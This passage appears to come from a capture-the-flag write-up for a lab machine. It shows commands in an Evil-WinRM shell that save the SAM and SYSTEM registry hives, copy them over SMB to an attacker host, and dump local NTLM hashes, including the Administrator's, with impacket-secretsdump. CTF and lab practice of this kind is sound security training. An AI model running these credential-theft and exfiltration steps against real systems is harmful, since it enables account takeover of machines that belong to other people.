
```powershell
*Evil-WinRM* PS C:\users\svc-printer\desktop> reg save hklm\system .\system.hive
The operation completed successfully.
*Evil-WinRM* PS C:\users\svc-printer\desktop> reg save hklm\sam .\sam.hive
The operation completed successfully.
*Evil-WinRM* PS C:\users\svc-printer\desktop> net use \\10.10.15.2\return /USER:user password
The command completed successfully.

*Evil-WinRM* PS C:\users\svc-printer\desktop> copy sam.hive \\10.10.15.2\return
*Evil-WinRM* PS C:\users\svc-printer\desktop> copy system.hive \\10.10.15.2\return
```

```sh
┌──(fixit42㉿kali)-[~/boxes/htb/return]
└─$ impacket-secretsdump -sam sam.hive -system system.hive LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0xa42289f69adb35cd67d02cc84e69c314
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Cleaning up... 
```

Administrator:aad3b435b51404eeaad3b435b51404ee:34386a771aaca697f447754e4863d38a

